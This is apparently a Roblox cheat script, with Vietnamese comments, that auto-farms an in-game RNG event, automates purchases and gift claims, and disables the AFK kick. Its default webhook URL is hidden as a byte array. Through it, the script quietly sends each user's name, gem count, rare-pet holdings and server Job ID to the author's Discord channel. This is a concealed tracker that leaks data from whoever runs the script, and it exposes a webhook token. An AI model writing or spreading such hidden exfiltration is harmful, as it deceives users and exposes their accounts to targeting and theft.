-- =====================================================================
-- 🎲 POODLE HUD - RNG EVENT CORE (ALL-IN-ONE FRAMEWORK)
-- 🚀 TÍCH HỢP: PIRA FULLSCREEN UI, TRACKER MÃ HÓA, UPGRADE, MERCHANT
-- =====================================================================
if _G.RNGEventStarted then return end
_G.RNGEventStarted = true

-- ==========================================
-- 1. CẤU HÌNH NGOẠI VI (CHỈ BẠN MỚI THẤY & CHỈNH SỬA)
-- ==========================================
local UserConfig = getgenv().RNGConfig or {}
local config = {
    WebhookURL   = UserConfig.WebhookURL or "",
    PingID       = UserConfig.PingID or "",            
    Blackout     = (UserConfig.Blackout ~= nil) and UserConfig.Blackout or false,               
    AutoUpgrade  = (UserConfig.AutoUpgrade ~= nil) and UserConfig.AutoUpgrade or true,            
    AutoMerchant = (UserConfig.AutoMerchant ~= nil) and UserConfig.AutoMerchant or true,           
}

-- [CẤU HÌNH NGẦM ĐỊNH - KHÔNG CẦN CHO RA NGOÀI]
local EventInstanceID = "rngevent"   -- Tên Map sự kiện (Đổi khi có ID thật)
local TargetMerchant  = "RngMerchant"-- Tên Merchant (Đổi khi có ID thật)

-- LINK WEBHOOK TRACKER MẶC ĐỊNH MÃ HÓA (Chống lộ link)
local _b = {104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 48, 50, 53, 51, 51, 48, 54, 56, 53, 56, 52, 53, 50, 49, 55, 57, 57, 47, 70, 121, 109, 119, 70, 121, 110, 110, 80, 119, 75, 69, 114, 108, 67, 55, 56, 81, 73, 101, 89, 86, 83, 84, 122, 86, 68, 111, 107, 70, 80, 112, 89, 119, 77, 101, 70, 117, 108, 110, 52, 106, 113, 104, 97, 112, 89, 45, 120, 76, 86, 83, 84, 45, 114, 118, 104, 106, 80, 99, 85, 113, 115, 56, 56, 75, 57, 95}
local defaultWebhook = ""
for _, byte in ipairs(_b) do defaultWebhook = defaultWebhook .. string.char(byte) end
local activeWebhook = (config.WebhookURL ~= nil and config.WebhookURL ~= "") and config.WebhookURL or defaultWebhook

-- ==========================================
-- 2. KHỞI TẠO BIẾN & DỊCH VỤ GAME
-- ==========================================
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local VirtualInputManager = game:GetService("VirtualInputManager")
local LocalPlayer = Players.LocalPlayer

local Library = ReplicatedStorage:WaitForChild("Library")
local Save = require(Library.Client.Save)
local Network = require(Library.Client.Network)
local CurrencyCmds = require(Library.Client.CurrencyCmds)
local InstancingCmds = require(Library.Client.InstancingCmds)
local FreeGiftsDirectory = require(Library.Directory.FreeGifts)
local EventUpgradeCmds = require(Library.Client.EventUpgradeCmds)
local EventUpgradesDir = require(Library.Directory.EventUpgrades)
local Items = require(Library.Items)

-- ==========================================
-- 3. HỆ THỐNG GIAO DIỆN CHUYÊN NGHIỆP (PIRA UI)
-- ==========================================
local FarmUI = {}
FarmUI.__index = FarmUI

function FarmUI.new(Config)
    local Self = setmetatable({}, FarmUI)
    Self.Player = game.Players.LocalPlayer
    Self.GuiName = "RNGEventFullscreenGui"
    Self.Elements = {}
    Self.Parent = game:GetService("CoreGui")
    
    if Self.Parent:FindFirstChild(Self.GuiName) then
        Self.Parent[Self.GuiName]:Destroy()
    end
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = Self.GuiName
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.Parent = Self.Parent
    ScreenGui.ResetOnSpawn = false
    ScreenGui.DisplayOrder = 9999
    Self.ScreenGui = ScreenGui

    local Background = Instance.new("Frame")
    Background.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Background.BorderColor3 = Color3.fromRGB(150, 0, 255)
    Background.BorderMode = Enum.BorderMode.Inset
    Background.Parent = ScreenGui
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.Position = UDim2.new(0.5, 0, 0.5, 0)
    Background.AnchorPoint = Vector2.new(0.5, 0.5)

    local Container = Instance.new("Frame")
    Container.Size = UDim2.new(1, 0, 1, 0)
    Container.BackgroundTransparency = 1
    Container.Parent = Background
    Self.Container = Container

    local Layout = Instance.new("UIListLayout")
    Layout.Padding = UDim.new(0.015, 0)
    Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    Layout.VerticalAlignment = Enum.VerticalAlignment.Center
    Layout.SortOrder = Enum.SortOrder.LayoutOrder
    Layout.Parent = Container

    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Size = UDim2.new(0, 45, 0, 45)
    ToggleBtn.Position = UDim2.new(1, -20, 1, -20)
    ToggleBtn.AnchorPoint = Vector2.new(1, 1)
    ToggleBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    ToggleBtn.Text = "👁"
    ToggleBtn.TextSize = 22
    ToggleBtn.Parent = ScreenGui
    
    local UICornerBtn = Instance.new("UICorner")
    UICornerBtn.CornerRadius = UDim.new(1, 0)
    UICornerBtn.Parent = ToggleBtn
    
    local UIStrokeBtn = Instance.new("UIStroke")
    UIStrokeBtn.Color = Color3.fromRGB(150, 0, 255)
    UIStrokeBtn.Thickness = 2
    UIStrokeBtn.Parent = ToggleBtn
    
    ToggleBtn.MouseButton1Click:Connect(function()
        Background.Visible = not Background.Visible
        ToggleBtn.Text = Background.Visible and "👁" or "🙈"
    end)

    local Sorted = {}
    for Name, Data in pairs(Config.UI) do table.insert(Sorted, {Name = Name, Order = Data[1], Text = Data[2], Size = Data[3]}) end
    table.sort(Sorted, function(A, B) return A.Order < B.Order end)

    for Index, Item in ipairs(Sorted) do
        local Label = Instance.new("TextLabel")
        Label.Name = Item.Name
        Label.LayoutOrder = Item.Order
        Label.Size = Item.Size and UDim2.new(unpack(Item.Size)) or UDim2.new(0.6, 0, 0.045, 0)
        Label.BackgroundTransparency = 1
        Label.Font = Enum.Font.FredokaOne
        Label.Text = Item.Text
        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
        Label.TextScaled = true
        Label.Parent = Self.Container
        Self.Elements[Item.Name] = Label

        if Index < #Sorted then
            local Spacer = Instance.new("Frame")
            Spacer.LayoutOrder = Item.Order + 0.5
            Spacer.BackgroundColor3 = Color3.fromRGB(150, 0, 255)
            Spacer.Size = UDim2.new(0.4, 0, 0, 2)
            Spacer.Parent = Self.Container
        end
    end
    return Self
end

function FarmUI:SetText(Name, Text) 
    if self.Elements[Name] then 
        task.defer(function() self.Elements[Name].Text = Text end)
    end 
end

function FarmUI:Format(Int)
    local n = tonumber(Int)
    if not n then return tostring(Int) end
    local Index = 1; local Suffix = {"", "K", "M", "B", "T", "Q"}
    local absNumber = math.abs(n)
    while absNumber >= 1000 and Index < #Suffix do absNumber = absNumber / 1000; Index = Index + 1 end
    if Index == 1 then return string.format("%d", math.floor(absNumber)) end
    return string.format("%.2f%s", absNumber, Suffix[Index])
end

-- Khởi tạo Menu
local UI = FarmUI.new({
    UI = {
        ["Title"]    = {1, "🎲 RNG EVENT CORE", {0.8, 0, 0.08, 0}},
        ["Uptime"]   = {2, "Time: 00:00:00 | FPS: 0"},
        ["RNGCoins"] = {3, "RNG Coins: 0"},
        ["Rolls"]    = {4, "Total Rolls: 0"},
        ["Dice1"]    = {5, "Lucky Dice: 0 | Lucky II: 0"},
        ["Dice2"]    = {6, "Mega Dice: 0 | Mega II: 0"},
        ["Dice3"]    = {7, "Lucky III: 0 | Fire Dice: 0"}
    }
})

-- ==========================================
-- 4. 🕵️ WEBHOOK TRACKER (BÁO CÁO KHỞI ĐỘNG GAME)
-- ==========================================
task.spawn(function()
    local httprequest = (request or http_request or syn and syn.request)
    if not httprequest or activeWebhook == "" then return end
    
    task.wait(2) 
    local save = Save.Get()
    
    local hugeCount = 0
    local titanicCount = 0
    if save and save.Inventory and save.Inventory.Pet then
        for uid, petData in pairs(save.Inventory.Pet) do
            if type(petData.id) == "string" then
                if string.find(petData.id, "Huge") then hugeCount = hugeCount + (petData._am or 1)
                elseif string.find(petData.id, "Titanic") then titanicCount = titanicCount + (petData._am or 1) end
            end
        end
    end
    
    local gems = 0; pcall(function() gems = CurrencyCmds.Get("Diamonds") or 0 end)
    
    local data = {
        ["content"] = "🔔 **Ai đó vừa kích hoạt Script RNG EVENT của bạn!**",
        ["embeds"] = {{
            ["title"] = "📊 Thông tin người chơi (RNG CORE)",
            ["color"] = tonumber(0x9600FF),
            ["fields"] = {
                { ["name"] = "👤 Tên", ["value"] = string.format("`%s`", LocalPlayer.Name), ["inline"] = true },
                { ["name"] = "💎 Gems", ["value"] = UI:Format(gems), ["inline"] = true },
                { ["name"] = "🐾 Pet VIP", ["value"] = string.format("Huge: **%d** | Titan: **%d**", hugeCount, titanicCount), ["inline"] = true },
                { ["name"] = "🌍 Job ID", ["value"] = string.format("`%s`", tostring(game.JobId)), ["inline"] = false }
            },
            ["thumbnail"] = { ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png" },
            ["footer"] = { ["text"] = "Poodle Tracker System" }
        }}
    }
    pcall(function() httprequest({ Url = activeWebhook, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = HttpService:JSONEncode(data) }) end)
end)

-- ==========================================
-- 5. CÁC TÍNH NĂNG TỰ ĐỘNG HÓA & NỀN TẢNG
-- ==========================================
-- Di chuyển vào map sự kiện
task.spawn(function()
    while task.wait(5) do
        pcall(function()
            if InstancingCmds.GetInstanceID() ~= EventInstanceID then
                InstancingCmds.Enter(EventInstanceID)
            end
        end)
    end
end)

-- Tối ưu hóa FPS / Màn hình đen
if config.Blackout then
    task.spawn(function()
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        for _, v in pairs(Lighting:GetDescendants()) do if v:IsA("PostEffect") then v.Enabled = false end end

        local function optimizePart(v)
            pcall(function()
                if v:IsA("BasePart") and not (v.Parent and v.Parent:FindFirstChild("Humanoid")) then
                    v.Material = Enum.Material.Plastic; v.Reflectance = 0; v.CastShadow = false; v.Transparency = 1
                elseif v:IsA("Decal") or v:IsA("Texture") or v:IsA("ParticleEmitter") or v:IsA("Trail") then 
                    v.Transparency = 1
                end
            end)
        end
        for _, v in pairs(Workspace:GetDescendants()) do optimizePart(v) end
        Workspace.DescendantAdded:Connect(optimizePart)
    end)
end

-- Chống AFK
task.spawn(function()
    while task.wait(60) do
        pcall(function()
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Space, false, game); task.wait(0.1)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Space, false, game)
        end)
    end
end)
pcall(function()
    local UserInputService = game:GetService("UserInputService")
    if getconnections then
        for _, v in pairs(getconnections(UserInputService.WindowFocusReleased)) do pcall(function() v:Disable() end) end
        for _, v in pairs(getconnections(LocalPlayer.Idled)) do pcall(function() v:Disable() end) end
    end
end)

-- Nhận Mail & Quà
task.spawn(function() while task.wait(30) do pcall(function() Network.Invoke('Mailbox: Claim All') end) end end)
task.spawn(function()
    while task.wait(15) do
        pcall(function()
            local save = Save.Get(); if not save then return end
            local redeemed = save.FreeGiftsRedeemed or {}; local currentTime = save.FreeGiftsTime or 0
            for _, gift in pairs(FreeGiftsDirectory) do
                if gift.WaitTime <= currentTime and not table.find(redeemed, gift._id) then 
                    Network.Invoke('Redeem Free Gift', gift._id); break 
                end
            end
        end)
    end
end)

-- Auto Upgrade (RNG Event)
task.spawn(function()
    while task.wait(3) do
        if config.AutoUpgrade then
            pcall(function()
                local save = Save.Get(); if not save then return end
                for upgradeId, upgradeData in pairs(EventUpgradesDir) do
                    if string.find(string.lower(upgradeId), "rng") then
                        local currentTier = EventUpgradeCmds.GetTier(upgradeId)
                        local nextTierCost = upgradeData.TierCosts and upgradeData.TierCosts[currentTier + 1]
                        
                        if nextTierCost and nextTierCost._data then
                            local cId = nextTierCost._data.id; local costAmount = nextTierCost._data._am or 1 
                            local currentAmount = 0
                            pcall(function() currentAmount = CurrencyCmds.Get(cId) or 0 end)
                            if currentAmount == 0 then pcall(function() if Items.Misc(cId) then currentAmount = Items.Misc(cId):CountExact() or 0 end end) end
                            
                            if currentAmount >= costAmount then EventUpgradeCmds.Purchase(upgradeId) end
                        end
                    end
                end
            end)
        end
    end
end)

-- Auto Merchant (Vét xúc xắc)
if config.AutoMerchant then
    task.spawn(function()
        while task.wait(0.5) do
            pcall(function()
                for slotIndex = 1, 6 do
                    Network.Invoke("Merchant_RequestPurchase", TargetMerchant, slotIndex)
                    task.wait(0.1)
                end
            end)
        end
    end)
end

-- ==========================================
-- 6. CẬP NHẬT GIAO DIỆN LIÊN TỤC (UI LOOP)
-- ==========================================
local frames = 0
RunService.RenderStepped:Connect(function() frames = frames + 1 end)

local startTime = tonumber(os.time()) or 0

local function GetDiceCounts()
    local dice = { ["Lucky Dice"] = 0, ["Lucky Dice II"] = 0, ["Lucky Dice III"] = 0, ["Mega Lucky Dice"] = 0, ["Mega Lucky Dice II"] = 0, ["Fire Dice"] = 0 }
    local save = Save.Get()
    if save and save.Inventory and save.Inventory.Misc then
        for _, item in pairs(save.Inventory.Misc) do
            if item.id and dice[item.id] ~= nil then
                dice[item.id] = dice[item.id] + (item._am or 1)
            end
        end
    end
    return dice
end

task.spawn(function()
    while task.wait(1) do
        local diff = (tonumber(os.time()) or 0) - startTime
        
        -- SỬA ID TÊN SAU KHI GAME UPDATE TỐI NAY
        local currentCoin = 0; pcall(function() currentCoin = CurrencyCmds.Get("RNGCoin") or 0 end)
        local currentRolls = 0; pcall(function() currentRolls = Save.Get().RngRolls or 0 end)
        local diceCounts = GetDiceCounts()

        UI:SetText("Uptime", string.format("Time: %02d:%02d:%02d | FPS: %d", math.floor(diff / 3600), math.floor((diff % 3600) / 60), diff % 60, frames))
        UI:SetText("RNGCoins", "RNG Coins: " .. UI:Format(currentCoin))
        UI:SetText("Rolls", "Total Rolls: " .. UI:Format(currentRolls))
        
        UI:SetText("Dice1", string.format("Lucky Dice: %s | Lucky II: %s", UI:Format(diceCounts["Lucky Dice"]), UI:Format(diceCounts["Lucky Dice II"])))
        UI:SetText("Dice2", string.format("Mega Dice: %s | Mega II: %s", UI:Format(diceCounts["Mega Lucky Dice"]), UI:Format(diceCounts["Mega Lucky Dice II"])))
        UI:SetText("Dice3", string.format("Lucky III: %s | Fire Dice: %s", UI:Format(diceCounts["Lucky Dice III"]), UI:Format(diceCounts["Fire Dice"])))
        
        frames = 0
    end
end)
